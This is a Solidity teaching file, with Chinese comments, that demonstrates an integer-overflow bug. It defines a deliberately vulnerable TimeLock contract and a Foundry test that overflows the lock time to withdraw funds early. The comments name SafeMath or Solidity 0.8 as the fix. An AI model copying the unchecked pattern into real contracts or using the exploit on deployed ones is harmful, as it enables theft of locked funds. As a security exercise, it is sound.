// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

// Overflow / Underflow
// 这种溢出只会发生在0.8.0以下的solidity版本,0.8.0以上溢出会直接revert
// 解决办法:
// 使用SafeMath库 (例如OpenZeppelin的SafeMath库)

import "forge-std/Test.sol";

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Failed to send Ether");
    }
}

contract Attacker is Test {
    TimeLock public timeLock;

    function setUp() public {
        timeLock = new TimeLock();
        vm.deal(address(this), 1 ether);
    }

    function testEploit() public {
        emit log_named_decimal_uint("Attacker balance of ETH before exploit", address(this).balance, 18);

        timeLock.deposit{value: 1 ether}();
        // !!!timeLock.lockTime(address(this))加上uint256(-timeLock.lockTime(address(this)))直接整数上溢,超过了type(uint256).max,变成了0
        timeLock.increaseLockTime(uint256(-timeLock.lockTime(address(this))));
        timeLock.withdraw();

        emit log_named_decimal_uint("Attacker balance of ETH after exploit", address(this).balance, 18);
    }

    fallback() external payable {}
}
